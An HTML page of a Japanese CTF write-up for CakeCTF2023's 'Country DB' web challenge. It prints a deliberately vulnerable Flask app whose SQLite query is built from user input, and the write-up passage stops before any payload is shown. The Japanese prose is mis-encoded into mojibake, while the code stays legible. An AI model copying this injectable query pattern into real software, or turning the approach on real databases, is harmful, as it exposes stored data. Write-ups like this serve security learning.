<!doctype html><html lang=ja dir=ltr>
<head><meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="ã¯ã˜ã‚ã« ä»Šå›ã€ãƒãƒ¼ãƒ ã€ŒğŸ£ã€ã®ãƒ¡ãƒ³ãƒãƒ¼ã¨ã—ã¦11/11ã‹ã‚‰11/12ã¾ã§é–‹å‚¬ã•ã‚Œã¦ã„ãŸCakeCTF2023ã«å‚åŠ ã—ã¾ã—ãŸã€‚ è¨˜éŒ²ã¨ã—ã¦ã€ã“ã“ã«WriteUpï¼ˆã¨æœŸé–“ä¸­ã«è§£ã‘ãªã‹ã£ãŸå•é¡Œï¼‰ã‚’æ®‹ã—ã¾ã™ã€‚
web Country DB [web, warmup] å•é¡Œã‚µã‚¤ãƒˆã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã¦ã¿ã¾ã™ã€‚ äºŒæ–‡å­—ã®å›½åã‚³ãƒ¼ãƒ‰ã‚’å…¥åŠ›ã™ã‚‹ã¨ã€ãã®å›½ãŒã©ã“ãªã®ã‹èª¿ã¹ã¦ãã‚Œã‚‹ã‚µã‚¤ãƒˆã®ã‚ˆã†ã§ã™ã€‚ ã“ã®ã‚µã‚¤ãƒˆã‚’æ§‹ç¯‰ã—ã¦ã„ã‚‹ã‚½ãƒ¼ã‚¹ãƒ•ã‚¡ã‚¤ãƒ«ç¾¤ã¯ä»¥ä¸‹ã®ã‚ˆã†ã«ãªã£ã¦ã„ã¾ã™ã€‚
1 2 3 4 5 6 7 8  . â”œâ”€â”€ app.py â”œâ”€â”€ docker-compose.yml â”œâ”€â”€ Dockerfile â”œâ”€â”€ init_db.py â”œâ”€â”€ templates â”‚ â””â”€â”€ index.html â””â”€â”€ uwsgi.ini   app.pyã‚’è¦‹ã¦ã¿ã¾ã™ã€‚
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35  #!"><title>CakeCTF2023 WriteUp</title>
<link rel=canonical href=https://hiro-1219.github.io/blog/p/cakectf2023-writeup/>
<link rel=stylesheet href=https://hiro-1219.github.io/blog/scss/style.min.5a8e892f6fa14515e9065eee1f5d2e05302606ec7f11750b2fb95198f9cdcbfd.css><meta property="og:title" content="CakeCTF2023 WriteUp">
<meta property="og:description" content="ã¯ã˜ã‚ã« ä»Šå›ã€ãƒãƒ¼ãƒ ã€ŒğŸ£ã€ã®ãƒ¡ãƒ³ãƒãƒ¼ã¨ã—ã¦11/11ã‹ã‚‰11/12ã¾ã§é–‹å‚¬ã•ã‚Œã¦ã„ãŸCakeCTF2023ã«å‚åŠ ã—ã¾ã—ãŸã€‚ è¨˜éŒ²ã¨ã—ã¦ã€ã“ã“ã«WriteUpï¼ˆã¨æœŸé–“ä¸­ã«è§£ã‘ãªã‹ã£ãŸå•é¡Œï¼‰ã‚’æ®‹ã—ã¾ã™ã€‚
web Country DB [web, warmup] å•é¡Œã‚µã‚¤ãƒˆã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã¦ã¿ã¾ã™ã€‚ äºŒæ–‡å­—ã®å›½åã‚³ãƒ¼ãƒ‰ã‚’å…¥åŠ›ã™ã‚‹ã¨ã€ãã®å›½ãŒã©ã“ãªã®ã‹èª¿ã¹ã¦ãã‚Œã‚‹ã‚µã‚¤ãƒˆã®ã‚ˆã†ã§ã™ã€‚ ã“ã®ã‚µã‚¤ãƒˆã‚’æ§‹ç¯‰ã—ã¦ã„ã‚‹ã‚½ãƒ¼ã‚¹ãƒ•ã‚¡ã‚¤ãƒ«ç¾¤ã¯ä»¥ä¸‹ã®ã‚ˆã†ã«ãªã£ã¦ã„ã¾ã™ã€‚
1 2 3 4 5 6 7 8  . â”œâ”€â”€ app.py â”œâ”€â”€ docker-compose.yml â”œâ”€â”€ Dockerfile â”œâ”€â”€ init_db.py â”œâ”€â”€ templates â”‚ â””â”€â”€ index.html â””â”€â”€ uwsgi.ini   app.pyã‚’è¦‹ã¦ã¿ã¾ã™ã€‚
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35  #!">
<meta property="og:url" content="https://hiro-1219.github.io/blog/p/cakectf2023-writeup/">
<meta property="og:site_name" content="ã‚„ã˜ã‚‹ã—ã®ãƒ–ãƒ­ã‚°">
<meta property="og:type" content="article"><meta property="article:section" content="Post"><meta property="article:published_time" content="2023-11-13T00:00:00+09:00"><meta property="article:modified_time" content="2023-11-13T00:00:00+09:00">
<meta name=twitter:title content="CakeCTF2023 WriteUp">
<meta name=twitter:description content="ã¯ã˜ã‚ã« ä»Šå›ã€ãƒãƒ¼ãƒ ã€ŒğŸ£ã€ã®ãƒ¡ãƒ³ãƒãƒ¼ã¨ã—ã¦11/11ã‹ã‚‰11/12ã¾ã§é–‹å‚¬ã•ã‚Œã¦ã„ãŸCakeCTF2023ã«å‚åŠ ã—ã¾ã—ãŸã€‚ è¨˜éŒ²ã¨ã—ã¦ã€ã“ã“ã«WriteUpï¼ˆã¨æœŸé–“ä¸­ã«è§£ã‘ãªã‹ã£ãŸå•é¡Œï¼‰ã‚’æ®‹ã—ã¾ã™ã€‚
web Country DB [web, warmup] å•é¡Œã‚µã‚¤ãƒˆã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã¦ã¿ã¾ã™ã€‚ äºŒæ–‡å­—ã®å›½åã‚³ãƒ¼ãƒ‰ã‚’å…¥åŠ›ã™ã‚‹ã¨ã€ãã®å›½ãŒã©ã“ãªã®ã‹èª¿ã¹ã¦ãã‚Œã‚‹ã‚µã‚¤ãƒˆã®ã‚ˆã†ã§ã™ã€‚ ã“ã®ã‚µã‚¤ãƒˆã‚’æ§‹ç¯‰ã—ã¦ã„ã‚‹ã‚½ãƒ¼ã‚¹ãƒ•ã‚¡ã‚¤ãƒ«ç¾¤ã¯ä»¥ä¸‹ã®ã‚ˆã†ã«ãªã£ã¦ã„ã¾ã™ã€‚
1 2 3 4 5 6 7 8  . â”œâ”€â”€ app.py â”œâ”€â”€ docker-compose.yml â”œâ”€â”€ Dockerfile â”œâ”€â”€ init_db.py â”œâ”€â”€ templates â”‚ â””â”€â”€ index.html â””â”€â”€ uwsgi.ini   app.pyã‚’è¦‹ã¦ã¿ã¾ã™ã€‚
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35  #!"><style>:root{--ja-font-family:"æ¸¸ã‚´ã‚·ãƒƒã‚¯ä½“", "Yu Gothic", YuGothic, "ãƒ’ãƒ©ã‚®ãƒè§’ã‚´ Pro", "Hiragino Kaku Gothic Pro", "ãƒ¡ã‚¤ãƒªã‚ª", "Meiryo";--base-font-family:"Lato", var(--sys-font-family), var(--ja-font-family), sans-serif;--article-font-size:10pt}</style>
<script async src="https://www.googletagmanager.com/gtag/js?id="></script>
<script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-JK7NDVM4ZK')</script>
</head>
<body class=article-page>
<script>(function(){const a='StackColorScheme';localStorage.getItem(a)||localStorage.setItem(a,"auto")})()</script><script>(function(){const b='StackColorScheme',a=localStorage.getItem(b),c=window.matchMedia('(prefers-color-scheme: dark)').matches===!0;a=='dark'||a==='auto'&&c?document.documentElement.dataset.scheme='dark':document.documentElement.dataset.scheme='light'})()</script>
<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky">
<button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label=ãƒ¡ãƒ‹ãƒ¥ãƒ¼ã‚’é–‹ããƒ»é–‰ã˜ã‚‹>
<span class=hamburger-box>
<span class=hamburger-inner></span>
</span>
</button>
<header>
<figure class=site-avatar>
<a href=https://hiro-1219.github.io/blog/>
<img src=https://hiro-1219.github.io/blog/img/avatar_hu2d1b87cef19df202ae4a3cd347a16f08_38532_300x0_resize_box_3.png width=300 height=304 class=site-logo loading=lazy alt=Avatar>
</a>
</figure>
<div class=site-meta>
<h1 class=site-name><a href=https://hiro-1219.github.io/blog/>ã‚„ã˜ã‚‹ã—ã®ãƒ–ãƒ­ã‚°</a></h1>
<h2 class=site-description>ã„ã‚ã„ã‚ã‹ãã¾ã™</h2>
</div>
</header><ol class=social-menu>
<li>
<a href=https://github.com/hiro-1219 target=_blank title=GitHub><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg>
</a>
</li>
<li>
<a href=https://twitter.com/Yajirushi_314 target=_blank title=Twitter><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M22 4.01c-1 .49-1.98.689-3 .99-1.121-1.265-2.783-1.335-4.38-.737S11.977 6.323 12 8v1c-3.245.083-6.135-1.395-8-4 0 0-4.182 7.433 4 11-1.872 1.247-3.739 2.088-6 2 3.308 1.803 6.913 2.423 10.034 1.517 3.58-1.04 6.522-3.723 7.651-7.742a13.84 13.84.0 00.497-3.753C20.18 7.773 21.692 5.25 22 4.009z"/></svg>
</a>
</li>
</ol><ol class=menu id=main-menu>
<li>
<a href=https://hiro-1219.github.io/blog/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
<span>Home</span>
</a>
</li>
<li>
<a href=https://hiro-1219.github.io/blog/archives/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
<span>Archives</span>
</a>
</li>
<li>
<a href=https://hiro-1219.github.io/blog/search/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
<span>Search</span>
</a>
</li>
<div class=menu-bottom-section>
<li id=i18n-switch><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M4 5h7"/><path d="M9 3v2c0 4.418-2.239 8-5 8"/><path d="M5 9c-.003 2.144 2.952 3.908 6.7 4"/><path d="M12 20l4-9 4 9"/><path d="M19.1 18h-6.2"/></svg>
<select name=language onchange="window.location.href=this.selectedOptions[0].value"><option value=https://hiro-1219.github.io/blog/ selected>æ—¥æœ¬èª</option><option value=https://hiro-1219.github.io/blog/en/>English</option></select>
</li>
<li id=dark-mode-toggle><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<span>ãƒ€ãƒ¼ã‚¯ãƒ¢ãƒ¼ãƒ‰</span>
</li>
</div>
</ol>
</aside>
<main class="main full-width">
<article class=main-article>
<header class=article-header>
<div class=article-details>
<header class=article-category>
<a href=https://hiro-1219.github.io/blog/categories/ctf/>
CTF
</a>
</header>
<div class=article-title-wrapper>
<h2 class=article-title>
<a href=https://hiro-1219.github.io/blog/p/cakectf2023-writeup/>CakeCTF2023 WriteUp</a>
</h2>
</div>
<footer class=article-time>
<div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
<time class=article-time--published>Nov 13, 2023</time>
</div>
<div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<time class=article-time--reading>
èª­äº†æ™‚é–“: 15åˆ†
</time>
</div>
</footer>
</div>
</header>
<section class=article-content>
<h3 id=ã¯ã˜ã‚ã«>ã¯ã˜ã‚ã«</h3>
<p>ä»Šå›ã€ãƒãƒ¼ãƒ ã€ŒğŸ£ã€ã®ãƒ¡ãƒ³ãƒãƒ¼ã¨ã—ã¦11/11ã‹ã‚‰11/12ã¾ã§é–‹å‚¬ã•ã‚Œã¦ã„ãŸCakeCTF2023ã«å‚åŠ ã—ã¾ã—ãŸã€‚
è¨˜éŒ²ã¨ã—ã¦ã€ã“ã“ã«WriteUpï¼ˆã¨æœŸé–“ä¸­ã«è§£ã‘ãªã‹ã£ãŸå•é¡Œï¼‰ã‚’æ®‹ã—ã¾ã™ã€‚</p>
<h2 id=web>web</h2>
<h3 id=country-db-web-warmup>Country DB [web, warmup]</h3>
<p>å•é¡Œã‚µã‚¤ãƒˆã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã¦ã¿ã¾ã™ã€‚
äºŒæ–‡å­—ã®å›½åã‚³ãƒ¼ãƒ‰ã‚’å…¥åŠ›ã™ã‚‹ã¨ã€ãã®å›½ãŒã©ã“ãªã®ã‹èª¿ã¹ã¦ãã‚Œã‚‹ã‚µã‚¤ãƒˆã®ã‚ˆã†ã§ã™ã€‚
ã“ã®ã‚µã‚¤ãƒˆã‚’æ§‹ç¯‰ã—ã¦ã„ã‚‹ã‚½ãƒ¼ã‚¹ãƒ•ã‚¡ã‚¤ãƒ«ç¾¤ã¯ä»¥ä¸‹ã®ã‚ˆã†ã«ãªã£ã¦ã„ã¾ã™ã€‚</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>.
â”œâ”€â”€ app.py
â”œâ”€â”€ docker-compose.yml
â”œâ”€â”€ Dockerfile
â”œâ”€â”€ init_db.py
â”œâ”€â”€ templates
â”‚   â””â”€â”€ index.html
â””â”€â”€ uwsgi.ini
</code></pre></td></tr></table>
</div>
</div><p><code>app.py</code>ã‚’è¦‹ã¦ã¿ã¾ã™ã€‚</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=ch>#!/usr/bin/env python3</span>
<span class=kn>import</span> <span class=nn>flask</span>
<span class=kn>import</span> <span class=nn>sqlite3</span>

<span class=n>app</span> <span class=o>=</span> <span class=n>flask</span><span class=o>.</span><span class=n>Flask</span><span class=p>(</span><span class=vm>__name__</span><span class=p>)</span>

<span class=k>def</span> <span class=nf>db_search</span><span class=p>(</span><span class=n>code</span><span class=p>):</span>
    <span class=k>with</span> <span class=n>sqlite3</span><span class=o>.</span><span class=n>connect</span><span class=p>(</span><span class=s1>&#39;database.db&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>conn</span><span class=p>:</span>
        <span class=n>cur</span> <span class=o>=</span> <span class=n>conn</span><span class=o>.</span><span class=n>cursor</span><span class=p>()</span>
        <span class=n>cur</span><span class=o>.</span><span class=n>execute</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;SELECT name FROM country WHERE code=UPPER(&#39;</span><span class=si>{</span><span class=n>code</span><span class=si>}</span><span class=s2>&#39;)&#34;</span><span class=p>)</span> <span class=c1># SQL injection</span>
        <span class=n>found</span> <span class=o>=</span> <span class=n>cur</span><span class=o>.</span><span class=n>fetchone</span><span class=p>()</span>
    <span class=k>return</span> <span class=kc>None</span> <span class=k>if</span> <span class=n>found</span> <span class=ow>is</span> <span class=kc>None</span> <span class=k>else</span> <span class=n>found</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span>

<span class=nd>@app</span><span class=o>.</span><span class=n>route</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>)</span>
<span class=k>def</span> <span class=nf>index</span><span class=p>():</span>
    <span class=k>return</span> <span class=n>flask</span><span class=o>.</span><span class=n>render_template</span><span class=p>(</span><span class=s2>&#34;index.html&#34;</span><span class=p>)</span>

<span class=nd>@app</span><span class=o>.</span><span class=n>route</span><span class=p>(</span><span class=s1>&#39;/api/search&#39;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;POST&#39;</span><span class=p>])</span>
<span class=k>def</span> <span class=nf>api_search</span><span class=p>():</span>
    <span class=n>req</span> <span class=o>=</span> <span class=n>flask</span><span class=o>.</span><span class=n>request</span><span class=o>.</span><span class=n>get_json</span><span class=p>()</span>
    <span class=k>if</span> <span class=s1>&#39;code&#39;</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>req</span><span class=p>:</span>
        <span class=n>flask</span><span class=o>.</span><span class=n>abort</span><span class=p>(</span><span class=mi>400</span><span class=p>,</span> <span class=s2>&#34;Empty country code&#34;</span><span class=p>)</span>

    <span class=n>code</span> <span class=o>=</span> <span class=n>req</span><span class=p>[</span><span class=s1>&#39;code&#39;</span><span class=p>]</span>
    <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>code</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>2</span> <span class=ow>or</span> <span class=s2>&#34;&#39;&#34;</span> <span class=ow>in</span> <span class=n>code</span><span class=p>:</span> <span class=c1># objectã‚’ã†ã¾ã„ã“ã¨ä½¿ãˆã°ã§ãã‚‹ã®ã§ã¯</span>
        <span class=n>flask</span><span class=o>.</span><span class=n>abort</span><span class=p>(</span><span class=mi>400</span><span class=p>,</span> <span class=s2>&#34;Invalid country code&#34;</span><span class=p>)</span>

    <span class=n>name</span> <span class=o>=</span> <span class=n>db_search</span><span class=p>(</span><span class=n>code</span><span class=p>)</span>
    <span class=k>if</span> <span class=n>name</span> <span class=ow>is</span> <span class=kc>None</span><span class=p>:</span>
        <span class=n>flask</span><span class=o>.</span><span class=n>abort</span><span class=p>(</span><span class=mi>404</span><span class=p>,</span> <span class=s2>&#34;No such country&#34;</span><span class=p>)</span>

    <span class=k>return</span> <span class=p>{</span><span class=s1>&#39;name&#39;</span><span class=p>:</span> <span class=n>name</span><span class=p>}</span>

<span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
    <span class=n>app</span><span class=o>.</span><span class=n>run</span><span class=p>(</span><span class=n>debug</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</code></pre></td></tr></table>
</div>
</div><p>å›½åã‚³ãƒ¼ãƒ‰<code>code</code>ã‹ã‚‰å›½åã‚’æ¢ã™ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã¯<code>POST /api/search</code>ã®ã‚ˆã†ã§ã™ã€‚
ã“ã“ã§ã€å‘¼ã³å‡ºã•ã‚Œã¦ã„ã‚‹<code>db_search</code>ã«ã¯SQLã«ã‚ˆã‚‹ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã®å•ã„åˆã‚ã›ã®éƒ¨åˆ†ã«SQL injectionãŒã§ãã‚‹ç®‡æ‰€ãŒã‚ã‚‹ã“ã¨ãŒåˆ†ã‹ã‚Šã¾ã™ã€‚(ã‚³ãƒ¡ãƒ³ãƒˆã§è¨˜ã—ãŸéƒ¨åˆ†)</p>
<p><code>init_db.py</code>ã‚‚ç¢ºèªã—ã¾ã™ã€‚</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=kn>import</span> <span class=nn>sqlite3</span>
<span class=kn>import</span> <span class=nn>os</span>

<span class=n>FLAG</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>getenv</span><span class=p>(</span><span class=s2>&#34;FLAG&#34;</span><span class=p>,</span> <span class=s2>&#34;FakeCTF{*** REDACTED ***}&#34;</span><span class=p>)</span>

<span class=n>conn</span> <span class=o>=</span> <span class=n>sqlite3</span><span class=o>.</span><span class=n>connect</span><span class=p>(</span><span class=s2>&#34;database.db&#34;</span><span class=p>)</span>
<span class=n>conn</span><span class=o>.</span><span class=n>execute</span><span class=p>(</span><span class=s2>&#34;&#34;&#34;CREATE TABLE country (
</span><span class=s2>  code TEXT NOT NULL,
</span><span class=s2>  name TEXT NOT NULL
</span><span class=s2>);&#34;&#34;&#34;</span><span class=p>)</span>
<span class=n>conn</span><span class=o>.</span><span class=n>execute</span><span class=p>(</span><span class=s2>&#34;&#34;&#34;CREATE TABLE flag (
</span><span class=s2>  flag TEXT NOT NULL
</span><span class=s2>);&#34;&#34;&#34;</span><span class=p>)</span>
<span class=n>conn</span><span class=o>.</span><span class=n>execute</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;INSERT INTO flag VALUES (?)&#34;</span><span class=p>,</span> <span class=p>(</span><span class=n>FLAG</span><span class=p>,))</span>

<span class=c1># Country list from https://gist.github.com/vxnick/380904</span>
<span class=n>countries</span> <span class=o>=</span> <span class=p>[</span>
    <span class=p>(</span><span class=s1>&#39;AF&#39;</span><span class=p>,</span> <span class=s1>&#39;Afghanistan&#39;</span><span class=p>),</span>
    <span class=p>(</span><span class=s1>&#39;AX&#39;</span><span class=p>,</span> <span class=s1>&#39;Aland Islands&#39;</span><span class=p>),</span>
    <span class=p>(</span><span class=s1>&#39;AL&#39;</span><span class=p>,</span> <span class=s1>&#39;Albania&#39;</span><span class=p>),</span>
    <span class=p>(</span><span class=s1>&#39;DZ&#39;</span><span class=p>,</span> <span class=s1>&#39;Algeria&#39;</span><span class=p>),</span>
    <span class=p>(</span><span class=s1>&#39;AS&#39;</span><span class=p>,</span> <span class=s1>&#39;American Samoa&#39;</span><span class=p>),</span>
<span class=o>...</span>
    <span class=p>(</span><span class=s1>&#39;WF&#39;</span><span class=p>,</span> <span class=s1>&#39;Wallis And Futuna&#39;</span><span class=p>),</span>
    <span class=p>(</span><span class=s1>&#39;EH&#39;</span><span class=p>,</span> <span class=s1>&#39;Western Sahara&#39;</span><span class=p>),</span>
    <span class=p>(</span><span class=s1>&#39;YE&#39;</span><span class=p>,</span> <span class=s1>&#39;Yemen&#39;</span><span class=p>),</span>
    <span class=p>(</span><span class=s1>&#39;ZM&#39;</span><span class=p>,</span> <span class=s1>&#39;Zambia&#39;</span><span class=p>),</span>
    <span class=p>(</span><span class=s1>&#39;ZW&#39;</span><span class=p>,</span> <span class=s1>&#39;Zimbabwe&#39;</span><span class=p>),</span>
<span class=p>]</span>
<span class=n>conn</span><span class=o>.</span><span class=n>executemany</span><span class=p>(</span><span class=s2>&#34;INSERT INTO country VALUES (?, ?)&#34;</span><span class=p>,</span> <span class=n>countries</span><span class=p>)</span>

<span class=n>conn</span><span class=o>.</span><span class=n>commit</span><span class=p>()</span>
<span class=n>conn</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</code></pre></td></tr></table>
</div>
</div><p>ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã«ã¯countryãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã®ã»ã‹ã«ã€flagãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ãŒã‚ã‚Šã¾ã™ã€‚
ã“ã“ã«å•ã„åˆã‚ã›ã¦flagã‚«ãƒ©ãƒ ã‚’è¡¨ç¤ºã™ã‚‹ã‚ˆã†ãªSQLæ–‡ã‚’ä½œã‚‹ã‚ˆã†ãªSQL injectionãŒè¡Œãˆã‚Œã°ã‚ˆã„ã§ã™ã€‚
ã—ã‹ã—ã€ã“ã‚Œã‚’è¡Œã†ãŸã‚ã®å•é¡Œç‚¹ãŒã„ãã¤ã‹ã‚ã‚Šã¾ã™ã€‚</p>
<ol>
<li>ãƒ–ãƒ©ã‚¦ã‚¶ã‹ã‚‰ãƒ•ã‚©ãƒ¼ãƒ ã‚’ä½¿ç”¨ã—ã¦<code>code</code>ã‚’é€ä¿¡ã™ã‚‹å ´åˆã€2æ–‡å­—ã¾ã§ã—ã‹å…¥åŠ›ã§ããªã„(<code>./template/index.html</code>å‚ç…§)</li>
<li>POSTã«ã‚ˆã‚Šå—ã‘å–ã£ãŸ<code>code</code>ã®é•·ã•ãŒ2æ–‡å­—ã‚‚ã—ãã¯<code>"'"</code>ã‚’å«ã‚“ã§ã¯ã„ã‘ãªã„(<code>app.py</code> 24~26è¡Œç›®)</li>
</ol>
<p>å•é¡Œç‚¹1ã¯curlãªã©ã‚’ç”¨ã„ã¦å¤–éƒ¨ã‹ã‚‰<code>/api/search</code>ã¸POSTãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ã‚‹ã“ã¨ã§è§£æ±ºã§ãã¾ã™ã€‚
å•é¡Œç‚¹2ã‚’è§£æ±ºã™ã‚‹ãŸã‚ã«ã€pythonã®format stringã®ç‰¹æ€§ã‚’åˆ©ç”¨ã—ã¾ã™ã€‚
